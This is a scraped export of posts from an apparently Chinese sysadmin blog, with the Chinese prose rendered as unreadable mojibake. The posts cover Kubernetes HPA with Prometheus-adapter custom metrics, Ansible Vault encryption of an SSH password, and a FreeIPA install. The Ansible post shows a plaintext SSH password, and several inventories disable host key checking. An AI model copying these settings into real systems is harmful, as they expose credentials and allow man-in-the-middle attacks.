rbac.create=\u0026#34;true\u0026#34; --namespace custom-metrics è®¿é—® external å’Œ custom éªŒè¯ä¸€ä¸‹ï¼š\n1kubectl get --raw \u0026#34;/apis/external.metrics.k8s.io/v1beta1\u0026#34; | jq 2{ 3 \u0026#34;kind\u0026#34;: \u0026#34;APIResourceList\u0026#34;, 4 \u0026#34;apiVersion\u0026#34;: \u0026#34;v1\u0026#34;, 5 \u0026#34;groupVersion\u0026#34;: \u0026#34;external.metrics.k8s.io/v1beta1\u0026#34;, 6 \u0026#34;resources\u0026#34;: [] 7} 8 9kubectl get --raw \u0026#34;/apis/custom.metrics.k8s.io/v1beta1\u0026#34; | jq 10{ 11 \u0026#34;kind\u0026#34;: \u0026#34;APIResourceList\u0026#34;, 12 \u0026#34;apiVersion\u0026#34;: \u0026#34;v1\u0026#34;, 13 \u0026#34;groupVersion\u0026#34;: \u0026#34;custom.metrics.k8s.io/v1beta1\u0026#34;, 14 \u0026#34;resources\u0026#34;: [ 15 { 16 \u0026#34;name\u0026#34;: \u0026#34;*/agent.googleapis.com|agent|api_request_count\u0026#34;, 17 \u0026#34;singularName\u0026#34;: \u0026#34;\u0026#34;, 18 \u0026#34;namespaced\u0026#34;: true, 19 \u0026#34;kind\u0026#34;: \u0026#34;MetricValueList\u0026#34;, 20 \u0026#34;verbs\u0026#34;: [ 21 \u0026#34;get\u0026#34; 22 ] 23 }, 24[...lots more metrics...] 25 { 26 \u0026#34;name\u0026#34;: \u0026#34;*/vpn.googleapis.com|tunnel_established\u0026#34;, 27 \u0026#34;singularName\u0026#34;: \u0026#34;\u0026#34;, 28 \u0026#34;namespaced\u0026#34;: true, 29 \u0026#34;kind\u0026#34;: \u0026#34;MetricValueList\u0026#34;, 30 \u0026#34;verbs\u0026#34;: [ 31 \u0026#34;get\u0026#34; 32 ] 33 } 34 ] 35} é‡å¤´æˆåœ¨ä¸‹é¢ï¼Œå…¶å® Prometheus Adaptor ä» Prometheus æ‹¿çš„æŒ‡æ ‡ä¹Ÿæ˜¯æœ‰é™çš„ï¼Œå¦‚æœæœ‰è‡ªå®šä¹‰æŒ‡æ ‡ï¼Œæˆ–è€…æƒ³å¤šæ‹¿äº›ï¼Œå°±å¾—ç»§ç»­æ‹“å±•ï¼ï¼ï¼\næœ€å¿«çš„æ–¹å¼æ˜¯ç¼–è¾‘ namespace æ˜¯ custom-metrics ä¸‹çš„ configmap ï¼Œåå­—æ˜¯ Prometheus-adapterï¼Œå¢åŠ seriesQuery\nseriesQueryé•¿è¿™æ ·å­ï¼Œä¸‹é¢æ˜¯ç»Ÿè®¡äº†æ‰€æœ‰ app=shopping-kart çš„ pod 5åˆ†é’Ÿä¹‹å†…çš„å˜åŒ–é€Ÿç‡æ€»å’Œï¼š\n1apiVersion: v1 2kind: ConfigMap 3metadata: 4 labels: 5 app: prometheus-adapter 6 chart: prometheus-adapter-v1.2.0 7 heritage: Tiller 8 release: prometheus-adapter 9 name: prometheus-adapter 10data: 11 config.yaml: | 12- seriesQuery: \u0026#39;{app=\u0026#34;shopping-kart\u0026#34;,kubernetes_namespace!=\u0026#34;\u0026#34;,kubernetes_pod_name!=\u0026#34;\u0026#34;}\u0026#39; 13 seriesFilters: [] 14 resources: 15 overrides: 16 kubernetes_namespace: 17 resource: namespace 18 kubernetes_pod_name: 19 resource: pod 20 name: 21 matches: \u0026#34;\u0026#34; 22 as: \u0026#34;\u0026#34; 23 metricsQuery: sum(rate(\u0026lt;\u0026lt;.Series\u0026gt;\u0026gt;{\u0026lt;\u0026lt;.LabelMatchers\u0026gt;\u0026gt;}[5m])) by (\u0026lt;\u0026lt;.GroupBy\u0026gt;\u0026gt;) Adapter configmapçš„é…ç½®å¦‚ä¸‹ï¼š\nseriesQuery tells the Prometheus Metric name to the adapterï¼ˆè¦å»prometheusæ‹¿ä»€ä¹ˆæŒ‡æ ‡ï¼‰\nresources tells which Kubernetes resources each metric is associated with or which labels does the metric include, e.g., namespace, pod etc.ï¼ˆå…³è”çš„èµ„æºï¼Œæœ€å¸¸ç”¨çš„å°±æ˜¯ pod å’Œ namespaceï¼‰\nmetricsQuery is the actual Prometheus query that needs to be performed to calculate the actual values.ï¼ˆå åŠ  seriesQuery åå‘é€ç»™prometheusçš„å®é™…æŸ¥è¯¢ï¼Œç”¨äºå¾—å‡ºæœ€ç»ˆçš„æŒ‡æ ‡å€¼ï¼‰\nname with which the metric should be exposed to the custom metrics APIï¼ˆæš´éœ²ç»™APIçš„æŒ‡æ ‡åï¼‰\nä¸¾ä¸ªä¾‹å­ï¼šå¦‚æœæˆ‘ä»¬è¦è®¡ç®— container_network_receive_packets_totalï¼Œåœ¨Prometheus UIé‡Œæˆ‘ä»¬è¦è¾“å…¥ä»¥ä¸‹è¡Œæ¥æŸ¥è¯¢:\nsum(rate(container_network_receive_packets_total{namespace=\u0026ldquo;default\u0026rdquo;,pod=~\u0026ldquo;php-deploy.*\u0026rdquo;}[10m])) by (pod)*\nè½¬æ¢æˆ Adapter çš„ metricsQuery å°±å˜æˆè¿™æ ·äº†ï¼Œå¾ˆéš¾æ‡‚ï¼š\n*metricsQuery: \u0026lsquo;sum(rate(\u0026laquo;.series\u0026raquo;{\u0026laquo;.labelmatchers\u0026raquo;}10m])) by (\u0026laquo;.groupby\u0026raquo;)\u0026rsquo;\u0026lt;/.groupby\u0026gt;\u0026lt;/.labelmatchers\u0026gt;\u0026lt;/.series\u0026gt;*\nå†ç»™ä¸ªä¾‹å­ï¼š\n1rate(gorush_total_push_count{instance=\u0026#34;push.server.com:80\u0026#34;,job=\u0026#34;push-server\u0026#34;}[5m]) å˜æˆ adapter çš„ configmap\n1apiVersion: v1 2data: 3 config.yaml: | 4 rules: 5 - seriesQuery: \u0026#39;{__name__=~\u0026#34;gorush_total_push_count\u0026#34;}\u0026#39; 6 seriesFilters: [] 7 resources: 8 overrides: 9 namespace: 10 resource: namespace 11 pod: 12 resource: pod 13 name: 14 matches: \u0026#34;\u0026#34; 15 as: \u0026#34;gorush_push_per_second\u0026#34; 16 metricsQuery: rate(\u0026lt;\u0026lt;.Series\u0026gt;\u0026gt;{\u0026lt;\u0026lt;.LabelMatchers\u0026gt;\u0026gt;}[5m]) ä¿®æ”¹äº†configmapï¼Œå¿…é¡»é‡å¯prometheus-adapterçš„podé‡æ–°åŠ è½½é…ç½®ï¼ï¼ï¼\nåœ¨hpaä¸­åº”ç”¨çš„ä¾‹å­ï¼š\n1apiVersion: autoscaling/v2beta1 2kind: HorizontalPodAutoscaler 3metadata: 4 name: gorush-hpa 5spec: 6 scaleTargetRef: 7 apiVersion: apps/v1 8 kind: Deployment 9 name: gorush 10 minReplicas: 1 11 maxReplicas: 5 12 metrics: 13 - type: Pods 14 pods: 15 metricName: gorush_push_per_second 16 targetAverageValue: 1m å†æ¥ä¸€ä¸ªï¼Œprometheus å‡½æ•°åæ˜¯ myapp_client_connectedï¼š\n1apiVersion: v1 2data: 3 config.yaml: | 4 rules: 5 - seriesQuery: \u0026#39;{__name__= \u0026#34;myapp_client_connected\u0026#34;}\u0026#39; 6 seriesFilters: [] 7 resources: 8 overrides: 9 k8s_namespace: 10 resource: namespace 11 k8s_pod_name: 12 resource: pod 13 name: 14 matches: \u0026#34;myapp_client_connected\u0026#34; 15 as: \u0026#34;\u0026#34; 16 metricsQuery: \u0026lt;\u0026lt;.Series\u0026gt;\u0026gt;{\u0026lt;\u0026lt;.LabelMatchers\u0026gt;\u0026gt;,container_name!=\u0026#34;POD\u0026#34;} hpaçš„ä½¿ç”¨\n1apiVersion: autoscaling/v2beta1 2kind: HorizontalPodAutoscaler 3metadata: 4 name: hpa-sim 5 namespace: default 6spec: 7 scaleTargetRef: 8 apiVersion: apps/v1 9 kind: Deployment 10 name: hpa-sim 11 minReplicas: 1 12 maxReplicas: 10 13 metrics: 14 - type: Pods 15 pods: 16 metricName: myapp_client_connected 17 targetAverageValue: 20 å¾ˆå¤æ‚å§ã€‚æˆ‘ä»¬ä¸‹é¢ç»™ä¸ªè¯¦ç»†ä¾‹å­\nä¸‰ã€è‡ªå®šä¹‰æŒ‡æ ‡å…¨å¥—ä¾‹å­ æˆ‘ä»¬å…ˆå®šä¹‰ä¸€ä¸ª deploymentï¼Œè¿è¡Œä¸€ä¸ª nginx-vts çš„ podï¼Œè¿™ä¸ªé•œåƒå…¶å®å·²ç»è‡ªå·±æš´éœ²å‡ºäº† metric æŒ‡æ ‡\n1apiVersion: apps/v1 2kind: Deployment 3metadata: 4 name: nginx-deploy 5 annotations: 6 prometheus.io/scrape: \u0026#34;true\u0026#34; 7 prometheus.io/port: \u0026#34;80\u0026#34; 8 prometheus.io/path: \u0026#34;/status/format/prometheus\u0026#34; 9spec: 10 selector: 11 matchLabels: 12 app: nginx-deploy 13 template: 14 metadata: 15 labels: 16 app: nginx-deploy 17 spec: 18 containers: 19 - name: nginx-deploy 20 image: cnych/nginx-vts:v1.0 21 resources: 22 limits: 23 cpu: 50m 24 requests: 25 cpu: 50m 26 ports: 27 - containerPort: 80 28 name: http ç„¶åå®šä¹‰ä¸ª svcï¼ŒæŠŠ80ç«¯å£æš´éœ²å‡ºå»\n1apiVersion: v1 2kind: Service 3metadata: 4 name: nginx-svc 5spec: 6 ports: 7 - port: 80 8 targetPort: 80 9 name: http 10 selector: 11 app: nginx-deploy 12 type: ClusterIP prometheus æ˜¯è‡ªåŠ¨å‘ç°çš„ï¼Œæ‰€ä»¥ annotations å°±ä¼šè§¦å‘ prometheus è‡ªåŠ¨å¼€å§‹æ”¶é›†è¿™äº› nginx metricæŒ‡æ ‡\né›†ç¾¤å†…èµ·ä¸ªshellï¼Œè®¿é—®çœ‹çœ‹\n1$ curl nginx-svc.default.svc.hbb.local/status/format/prometheus 2# HELP nginx_vts_info Nginx info 3# TYPE nginx_vts_info gauge 4nginx_vts_info{hostname=\u0026#34;nginx-deployment-65d8df7488-c578v\u0026#34;,version=\u0026#34;1.13.12\u0026#34;} 1 5# HELP nginx_vts_start_time_seconds Nginx start time 6# TYPE nginx_vts_start_time_seconds gauge 7nginx_vts_start_time_seconds 1574283147.043 8# HELP nginx_vts_main_connections Nginx connections 9# TYPE nginx_vts_main_connections gauge 10nginx_vts_main_connections{status=\u0026#34;accepted\u0026#34;} 215 11nginx_vts_main_connections{status=\u0026#34;active\u0026#34;} 4 12nginx_vts_main_connections{status=\u0026#34;handled\u0026#34;} 215 13nginx_vts_main_connections{status=\u0026#34;reading\u0026#34;} 0 14nginx_vts_main_connections{status=\u0026#34;requests\u0026#34;} 15577 15nginx_vts_main_connections{status=\u0026#34;waiting\u0026#34;} 3 16nginx_vts_main_connections{status=\u0026#34;writing\u0026#34;} 1 17# HELP nginx_vts_main_shm_usage_bytes Shared memory [ngx_http_vhost_traffic_status] info 18# TYPE nginx_vts_main_shm_usage_bytes gauge 19nginx_vts_main_shm_usage_bytes{shared=\u0026#34;max_size\u0026#34;} 1048575 20nginx_vts_main_shm_usage_bytes{shared=\u0026#34;used_size\u0026#34;} 3510 21nginx_vts_main_shm_usage_bytes{shared=\u0026#34;used_node\u0026#34;} 1 22# HELP nginx_vts_server_bytes_total The request/response bytes 23# TYPE nginx_vts_server_bytes_total counter 24# HELP nginx_vts_server_requests_total The requests counter 25# TYPE nginx_vts_server_requests_total counter 26# HELP nginx_vts_server_request_seconds_total The request processing time in seconds 27# TYPE nginx_vts_server_request_seconds_total counter 28# HELP nginx_vts_server_request_seconds The average of request processing times in seconds 29# TYPE nginx_vts_server_request_seconds gauge 30# HELP nginx_vts_server_request_duration_seconds The histogram of request processing time 31# TYPE nginx_vts_server_request_duration_seconds histogram 32# HELP nginx_vts_server_cache_total The requests cache counter 33# TYPE nginx_vts_server_cache_total counter 34nginx_vts_server_bytes_total{host=\u0026#34;_\u0026#34;,direction=\u0026#34;in\u0026#34;} 3303449 35nginx_vts_server_bytes_total{host=\u0026#34;_\u0026#34;,direction=\u0026#34;out\u0026#34;} 61641572 36nginx_vts_server_requests_total{host=\u0026#34;_\u0026#34;,code=\u0026#34;1xx\u0026#34;} 0 37nginx_vts_server_requests_total{host=\u0026#34;_\u0026#34;,code=\u0026#34;2xx\u0026#34;} 15574 38nginx_vts_server_requests_total{host=\u0026#34;_\u0026#34;,code=\u0026#34;3xx\u0026#34;} 0 39nginx_vts_server_requests_total{host=\u0026#34;_\u0026#34;,code=\u0026#34;4xx\u0026#34;} 2 40nginx_vts_server_requests_total{host=\u0026#34;_\u0026#34;,code=\u0026#34;5xx\u0026#34;} 0 41nginx_vts_server_requests_total{host=\u0026#34;_\u0026#34;,code=\u0026#34;total\u0026#34;} 15576 42nginx_vts_server_request_seconds_total{host=\u0026#34;_\u0026#34;} 0.000 43nginx_vts_server_request_seconds{host=\u0026#34;_\u0026#34;} 0.000 44nginx_vts_server_cache_total{host=\u0026#34;_\u0026#34;,status=\u0026#34;miss\u0026#34;} 0 45nginx_vts_server_cache_total{host=\u0026#34;_\u0026#34;,status=\u0026#34;bypass\u0026#34;} 0 46nginx_vts_server_cache_total{host=\u0026#34;_\u0026#34;,status=\u0026#34;expired\u0026#34;} 0 47nginx_vts_server_cache_total{host=\u0026#34;_\u0026#34;,status=\u0026#34;stale\u0026#34;} 0 48nginx_vts_server_cache_total{host=\u0026#34;_\u0026#34;,status=\u0026#34;updating\u0026#34;} 0 49nginx_vts_server_cache_total{host=\u0026#34;_\u0026#34;,status=\u0026#34;revalidated\u0026#34;} 0 50nginx_vts_server_cache_total{host=\u0026#34;_\u0026#34;,status=\u0026#34;hit\u0026#34;} 0 51nginx_vts_server_cache_total{host=\u0026#34;_\u0026#34;,status=\u0026#34;scarce\u0026#34;} 0 52nginx_vts_server_bytes_total{host=\u0026#34;*\u0026#34;,direction=\u0026#34;in\u0026#34;} 3303449 53nginx_vts_server_bytes_total{host=\u0026#34;*\u0026#34;,direction=\u0026#34;out\u0026#34;} 61641572 54nginx_vts_server_requests_total{host=\u0026#34;*\u0026#34;,code=\u0026#34;1xx\u0026#34;} 0 55nginx_vts_server_requests_total{host=\u0026#34;*\u0026#34;,code=\u0026#34;2xx\u0026#34;} 15574 56nginx_vts_server_requests_total{host=\u0026#34;*\u0026#34;,code=\u0026#34;3xx\u0026#34;} 0 57nginx_vts_server_requests_total{host=\u0026#34;*\u0026#34;,code=\u0026#34;4xx\u0026#34;} 2 58nginx_vts_server_requests_total{host=\u0026#34;*\u0026#34;,code=\u0026#34;5xx\u0026#34;} 0 59nginx_vts_server_requests_total{host=\u0026#34;*\u0026#34;,code=\u0026#34;total\u0026#34;} 15576 60nginx_vts_server_request_seconds_total{host=\u0026#34;*\u0026#34;} 0.000 61nginx_vts_server_request_seconds{host=\u0026#34;*\u0026#34;} 0.000 62nginx_vts_server_cache_total{host=\u0026#34;*\u0026#34;,status=\u0026#34;miss\u0026#34;} 0 63nginx_vts_server_cache_total{host=\u0026#34;*\u0026#34;,status=\u0026#34;bypass\u0026#34;} 0 64nginx_vts_server_cache_total{host=\u0026#34;*\u0026#34;,status=\u0026#34;expired\u0026#34;} 0 65nginx_vts_server_cache_total{host=\u0026#34;*\u0026#34;,status=\u0026#34;stale\u0026#34;} 0 66nginx_vts_server_cache_total{host=\u0026#34;*\u0026#34;,status=\u0026#34;updating\u0026#34;} 0 67nginx_vts_server_cache_total{host=\u0026#34;*\u0026#34;,status=\u0026#34;revalidated\u0026#34;} 0 68nginx_vts_server_cache_total{host=\u0026#34;*\u0026#34;,status=\u0026#34;hit\u0026#34;} 0 69nginx_vts_server_cache_total{host=\u0026#34;*\u0026#34;,status=\u0026#34;scarce\u0026#34;} 0 ç„¶åç”¨ wrk éšæœºå‘ç‹‚å‘è¯·æ±‚å‹ä¸€æŠŠï¼Œæˆ‘ä»¬å» prometheus çš„é¢æ¿çœ‹çœ‹æŒ‡æ ‡è¢«æ”¶é›†åˆ°æ²¡æœ‰\nå¾ˆç–¯ç‹‚å•Šã€‚æˆ‘ä»¬ç¼–è¾‘ Prometheus-Adapter çš„ configmap ï¼ŒåŠ ä¸Šå¦‚ä¸‹å†…å®¹\n1rules: 2- seriesQuery: \u0026#39;nginx_vts_server_requests_total\u0026#39; 3 seriesFilters: [] 4 resources: 5 overrides: 6 kubernetes_namespace: 7 resource: namespace 8 kubernetes_pod_name: 9 resource: pod 10 name: 11 matches: \u0026#34;^(.*)_total\u0026#34; 12 as: \u0026#34;${1}_per_second\u0026#34; 13 metricsQuery: (sum(rate(\u0026lt;\u0026lt;.Series\u0026gt;\u0026gt;{\u0026lt;\u0026lt;.LabelMatchers\u0026gt;\u0026gt;}[1m])) by (\u0026lt;\u0026lt;.GroupBy\u0026gt;\u0026gt;)) ç„¶åæ€äº† Prometheus-Adapter çš„ Pod è®©å®ƒé‡å¯é‡æ–°åŠ è½½é…ç½®ï¼Œè¿‡æ®µæ—¶é—´è®¿é—®ä¸€ä¸‹ï¼Œçœ‹çœ‹å€¼ï¼Œæ˜¯527m\n1kubectl get --raw \u0026#34;/apis/custom.metrics.k8s.io/v1beta1/namespaces/default/pods/*/nginx_vts_server_requests_per_second\u0026#34; | jq . 2{ 3 \u0026#34;kind\u0026#34;: \u0026#34;MetricValueList\u0026#34;, 4 \u0026#34;apiVersion\u0026#34;: \u0026#34;custom.metrics.k8s.io/v1beta1\u0026#34;, 5 \u0026#34;metadata\u0026#34;: { 6 \u0026#34;selfLink\u0026#34;: \u0026#34;/apis/custom.metrics.k8s.io/v1beta1/namespaces/default/pods/%2A/nginx_vts_server_requests_per_second\u0026#34; 7 }, 8 \u0026#34;items\u0026#34;: [ 9 { 10 \u0026#34;describedObject\u0026#34;: { 11 \u0026#34;kind\u0026#34;: \u0026#34;Pod\u0026#34;, 12 \u0026#34;namespace\u0026#34;: \u0026#34;default\u0026#34;, 13 \u0026#34;name\u0026#34;: \u0026#34;hpa-prom-demo-755bb56f85-lvksr\u0026#34;, 14 \u0026#34;apiVersion\u0026#34;: \u0026#34;/v1\u0026#34; 15 }, 16 \u0026#34;metricName\u0026#34;: \u0026#34;nginx_vts_server_requests_per_second\u0026#34;, 17 \u0026#34;timestamp\u0026#34;: \u0026#34;2020-04-07T09:45:45Z\u0026#34;, 18 \u0026#34;value\u0026#34;: \u0026#34;527m\u0026#34;, 19 \u0026#34;selector\u0026#34;: null 20 } 21 ] 22} okï¼Œæ²¡é—®é¢˜ï¼Œæˆ‘ä»¬å®šä¹‰ä¸ªhpaï¼Œæ ¹æ®è¿™ä¸ªæŒ‡æ ‡æ¥ä¼¸ç¼©\n1apiVersion: autoscaling/v2beta1 2kind: HorizontalPodAutoscaler 3metadata: 4 name: nginx-hpa 5spec: 6 scaleTargetRef: 7 apiVersion: apps/v1 8 kind: Deployment 9 name: nginx-deploy 10 minReplicas: 2 11 maxReplicas: 5 12 metrics: 13 - type: Pods 14 pods: 15 metricName: nginx_vts_server_requests_per_second 16 targetAverageValue: 10 è¿™æ ·å°±å¥½äº†ã€‚\nå¦‚æœ pod æœ¬èº«ä¸èƒ½æš´éœ² metric ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨ sidecar é‡Œå®‰è£… exporter æ¥æ”¶é›†æ•°æ®å¹¶æš´éœ²å‡ºå»å°±å¯ä»¥äº†ã€‚\n","date":"2021-11-25","img":"","permalink":"https://rendoumi.com/posts/20211125-kubernetes_hpa/","series":null,"tags":null,"title":"Kubernetesçš„hpaå’Œè‡ªå®šä¹‰æŒ‡æ ‡hpa"},{"categories":null,"content":"å…¬å¸å·²ç»ç”± saltstack å…¨é¢è½¬å‘äº† ansible ã€‚\nç”¨ ansible-playbook æ‰§è¡Œå„ç§ä»»åŠ¡çš„æ—¶å€™ï¼Œéœ€è¦ç™»å½•ä¸»æœºï¼Œå°±å¿…ç„¶æ¶‰åŠåˆ°ä¸»æœº ssh å¯†ç çš„è¾“å…¥ã€‚\næœ€æ—©æˆ‘ä»¬æ˜¯åœ¨ inventory é‡Œåšäº†å®šä¹‰ï¼š\n1[deqin:vars] 2ansible_ssh_common_args=\u0026#34;-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null\u0026#34; 3host_key_checking=False 4ansible_ssh_user=\u0026#34;peadmin\u0026#34; 5ansible_ssh_pass=\u0026#34;Fuck2021!\u0026#34; 6 7[deqin] 8192.168.1.19 å¤ªç›´ç™½äº†ï¼Œæ‰€æœ‰çœ‹åˆ°è¿™æ–‡ä»¶å†…å®¹çš„äººéƒ½ä¼šçŸ¥é“å¯†ç äº†ã€‚å®Œå…¨æ²¡æœ‰å®‰å…¨æ€§ï¼Œè¿™æ ·è¡Œä¸é€šå•Šï¼\nå¥½åœ¨ ansible-vault æä¾›äº†ä¸€ç§æ–¹æ³•æ¥è§£å†³ï¼šé‚£å°±æ˜¯ç”Ÿæˆä¸€ä¸ªå¯†æ–‡æ”¾è¿›å»ï¼Œç„¶åè§£å¼€å®ƒå¿…é¡»å†è¾“å…¥ä¸€ä¸ªå¯†ç ã€‚è¿™æ ·çœ‹åˆ°çš„äººä¹Ÿä¸çŸ¥é“å®é™…çš„å¯†ç åˆ°åº•æ˜¯ä»€ä¹ˆ\nå…·ä½“çš„åšæ³•å¦‚ä¸‹ï¼Œé¦–å…ˆç”Ÿæˆ key \u0026ndash;\u0026gt; åŠ å¯†å­—ç¬¦ä¸²çš„é”®å€¼å¯¹ï¼š\n1ansible-vault encrypt_string \u0026#39;Fuck2021!\u0026#39; --name \u0026#39;ansible_ssh_pass\u0026#39; è¾“å…¥å¯†ç ï¼Œä¼šå¾—åˆ°ä¸‹é¢ä¸€ä¸²å­—ç¬¦\n1ansible_ssh_pass: !vault | 2 $ANSIBLE_VAULT;1.1;AES256 3 37393235646234613332646366306233346330656666623862313339313861393239646261366237 4 6663343263363161643634653266343466356634656539650a393834663938636165336431656433 5 66333761643538623434363334316661653035313166333137373562363436613636366162353239 6 3661623733323933350a373164626131646235616361356638653733646534616163393362373135 7 6139 è¿™ä¸ªå°±æ˜¯å¯†æ–‡äº†ï¼Œå¿…é¡»ç”¨è¾“å…¥çš„å¯†ç æ‰èƒ½è§£å¼€ã€‚\næ³¨æ„ï¼šè¿™é‡Œçš„é”®å€¼ name ä¸å¯æ”¹å˜ï¼Œå¦‚æœä½ æƒ³æŠŠå­—ç¬¦ä¸²æ‹·è´ä¸‹æ¥ï¼Œæ”¹æ‰ ansible_ssh_pass çš„åå­—ï¼Œæ”¹æˆåˆ«çš„ï¼Œæƒ³æ”¹åå¼•ç”¨ï¼Œæ˜¯ä¸è¡Œçš„ã€‚\nè¿™ä¸€å¤§é•¿ä¸²å¯†æ–‡æœ‰ä»¥ä¸‹ä¸¤ç§ç”¨æ³•ï¼š\nä¸€ã€iniæ ¼å¼çš„inventoryå¼•ç”¨ æœ€åŸå§‹çš„ inventory.ini å†…å®¹å¦‚ä¸‹ï¼š\n1[deqin:vars] 2ansible_ssh_common_args=\u0026#34;-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null\u0026#34; 3host_key_checking=False 4ansible_ssh_user=\u0026#34;peadmin\u0026#34; 5 6[deqin] 7192.168.1.19 æˆ‘ä»¬å®šä¹‰ playbook æ–‡ä»¶ shenji.ymlï¼š\n1- hosts: deqin 2 become: yes 3 vars_files: 4 - pass.yml 5 vars: 6 ansible_ssh_pass: \u0026#39;{{ ansible_ssh_pass }}\u0026#39; 7 8 tasks: 9 - name: mkdirs 10 file: path=\u0026#34;{{ item }}\u0026#34; state=directory 11 with_items: 12 - \u0026#34;OS.05\u0026#34; 13 - \u0026#34;OS.06\u0026#34; æŠŠå¯†æ–‡æ”¾è¿› pass.yml æ–‡ä»¶\n1cat \u0026lt;\u0026lt; EOF \u0026gt;\u0026gt; pass.yml 2ansible_ssh_pass: !vault | 3 $ANSIBLE_VAULT;1.1;AES256 4 37393235646234613332646366306233346330656666623862313339313861393239646261366237 5 6663343263363161643634653266343466356634656539650a393834663938636165336431656433 6 66333761643538623434363334316661653035313166333137373562363436613636366162353239 7 3661623733323933350a373164626131646235616361356638653733646534616163393362373135 8 6139 9EOF è¿è¡Œ playbookï¼š\n1ansible-playbook --ask-vault-pass -i inventory.ini shenji.yml -vvv ä¸ºä»€ä¹ˆè¿™æ ·å‘¢ï¼Ÿå› ä¸º ansible-vault åŠ å¯†è¿‡çš„å­—ç¬¦ä¸²æ˜¯ yaml æ ¼å¼çš„ï¼Œåœ¨ ini é‡Œæ— æ³•ç›´æ¥å¼•ç”¨ã€‚\næ‰€ä»¥åœ¨ playbook çš„ yaml æ–‡ä»¶ä¸­å¼•å…¥å®ƒï¼Œç„¶åå†è·Ÿä» inventory.ini ä¸­è·å–çš„å˜é‡åˆä½œä¸€èµ·ã€‚\näºŒã€yamlæ ¼å¼çš„inventoryå¼•ç”¨ ä¸Šé¢æˆ‘ä»¬çœ‹åˆ°äº†å¿…é¡»é—´æ¥å¼•ç”¨æ‰å¯ä»¥ï¼Œä¸ºäº†é¿å…æ‰ pass.yml æ–‡ä»¶ï¼Œé‚£ä¹ˆå¹²è„†æŠŠ inventroy ç”¨ yaml æ ¼å¼æ¥å†™ï¼Œé‚£ä¸å°±å¯ä»¥äº†ä¹ˆ\nå¦‚ä¸‹å³å¯ï¼š\n1cat \u0026lt;\u0026lt; EOF \u0026gt;\u0026gt; inventory.yml 2--- 3all: 4 hosts: 5 deqin: 6 ansible_host: 192.168.1.19 7 vars: 8 host_key_checking: \u0026#34;False\u0026#34; 9 ansible_ssh_common_args: \u0026#34;-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null\u0026#34; 10 ansible_ssh_pass: !vault | 11 $ANSIBLE_VAULT;1.1;AES256 12 37393235646234613332646366306233346330656666623862313339313861393239646261366237 13 6663343263363161643634653266343466356634656539650a393834663938636165336431656433 14 66333761643538623434363334316661653035313166333137373562363436613636366162353239 15 3661623733323933350a373164626131646235616361356638653733646534616163393362373135 16 6139 17EOF ç„¶åè¿è¡Œå°±å¯ä»¥äº†ï¼š\n1ansible-playbook --ask-vault-pass -i inventory.yml shenji.yml -vvv ","date":"2021-11-24","img":"","permalink":"https://rendoumi.com/posts/20211124-ansible_vault/","series":null,"tags":null,"title":"Ansible VaultåŠ å¯†çš„ä½¿ç”¨"},{"categories":null,"content":"å®¡è®¡å•Šå®¡è®¡ï¼Œå…¬å¸ä½¿ç”¨çš„åä¸ºé˜²ç«å¢™éœ€è¦é…ç½®åŒå› å­ç™»å½•è®¤è¯ï¼Œè¿™ä¸‹éº»çƒ¦äº†ã€‚\næŸ¥äº†ä¸€ä¸‹åä¸ºæ‰‹å†Œï¼Œæ”¯æŒ Radius è®¤è¯ï¼Œé‚£ä¹ˆæ²¡åŠæ³•ï¼Œæœ€çœé’±çš„åŠæ³•å°±æ˜¯ç”¨ FreeIPA å’Œ FreeRadius æ­ä¸€å¥— OTP åŒå› å­è®¤è¯äº†ã€‚\nç³»ç»Ÿæ˜¯ CentOS 7 ï¼Œå·²å…³é—­é˜²ç«å¢™æœåŠ¡ï¼Œæ–¹æ³•å¦‚ä¸‹ï¼š\nä¸€ã€æ­å»ºFreeIPA é¦–å…ˆè®¾ç½® hostname\n1hostnamectl set-hostname freeipa.rendoumi.local 2 3echo \u0026#34;192.168.1.5 freeipa.rendoumi.local\u0026#34; \u0026gt;\u0026gt; /etc/hosts ç„¶åå®‰è£… FreeIPAï¼Œæ³¨æ„è¦å›ç­”çš„å‡ ä¸ªé—®é¢˜\nä¸è£…bindï¼Œæ— è®ºæ˜¯ dnsmasq æˆ– corednsï¼Œéƒ½æ¯” bind è½»ï¼Œè¦è£…ä¹Ÿè£…é‚£ä¸¤ä¸ªã€‚ server hostname æ˜¯ freeipa.rendoumi.local domian name æ˜¯ rendoumi.local realm name æ˜¯å¤§å†™çš„ RENDOUMI.LOCAL æœ‰ä¸¤ä¸ªå¯†ç ï¼Œç¬¬ä¸€ä¸ªæ˜¯ LDAP çš„å¯†ç ï¼Œç¬¬äºŒä¸ªæ˜¯ IPA çš„å¯†ç  1yum -y install deltarpm 2yum update 3 4yum -y install freeipa-server 5 6sysctl net.ipv6.conf.all.disable_ipv6=0 7 8ipa-server-install 9 10This program will set up the IPA Server. 11 12This includes: 13 * Configure a stand-alone CA (dogtag) for certificate management 14 * Configure the Network Time Daemon (ntpd) 15 * Create and configure an instance of Directory Server 16 * Create and configure a Kerberos Key Distribution Center (KDC) 17 * Configure Apache (httpd) 18 19To accept the default shown in brackets, press the Enter key. 20 21WARNING: conflicting time\u0026amp;date synchronization service \u0026#39;chronyd\u0026#39; will be disabled in favor of ntpd 22 23Do you want to configure integrated DNS (BIND)? [no]:no 24 25Server host name [freeipa.rendoumi.local]: 26 27Please confirm the domain name [rendoumi.local]: 28 29Please provide a realm name [RENDOUMI.LOCAL]: 30 31Directory Manager password: 32Password (confirm): 33... 34IPA admin password: 35Password (confirm): 36 37The IPA Master Server will be configured with: 38Hostname: freeipa.rendoumi.local 39IP address(es): 192.168.1.5 40Domain name: rendoumi.local 41Realm name: RENDOUMI.LOCAL 42 43Continue to configure the system with these values? [no]: yes 44 45The following operations may take some minutes to complete. 46Please wait until the prompt is returned. 47 48Configuring NTP daemon (ntpd) 49 50... 51 52Setup complete 53 54Next steps: 55 1. You must make sure these network ports are open: 56 TCP Ports: 57 * 80, 443: HTTP/HTTPS 58 * 389, 636: LDAP/LDAPS 59 * 88, 464: kerberos 60 UDP Ports: 61 * 88, 464: kerberos 62 * 123: ntp 63 64 2. You can now obtain a kerberos ticket using the command: \u0026#39;kinit admin\u0026#39; 65 This ticket will allow you to use the IPA tools (e.g., ipa user-add) 66 and the web user interface. 67 68Be sure to back up the CA certificate stored in /root/cacert.p12 69This file is required to create replicas. The password for this file is the Directory Manager password ä»¥ä¸Šï¼Œå°±è£…å¥½äº† 